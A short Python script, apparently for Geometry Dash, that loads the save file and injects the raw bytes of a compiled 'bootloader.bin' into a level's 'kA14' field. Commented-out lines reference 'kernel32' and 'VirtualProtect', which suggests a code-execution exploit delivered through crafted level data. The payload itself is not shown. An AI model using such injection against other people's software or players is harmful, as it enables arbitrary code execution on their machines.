import gzip
import base64
import re
import gd

db = gd.api.save.load()
levels = db.get_created_levels()
lvl = levels[0]

with open("./build/bootloader.bin", "rb") as f:
	data = str(f.read(), "ansi")
	#payload = f.read()
	
	#data = base64.urlsafe_b64encode(bytes("kernel32\0", "utf-16") + bytes("VirtualProtect\0", "utf-8") + payload).decode()

	print("payload length = " + str(len(data)))

	#data = "1~1"
	lvl_string = lvl.get_data()
	lvl_string = re.sub('kA14,[^,]*?,', f'kA14,{data},', lvl_string)
	lvl.set_data(lvl_string)

db.dump_created_levels(levels)
db.dump()
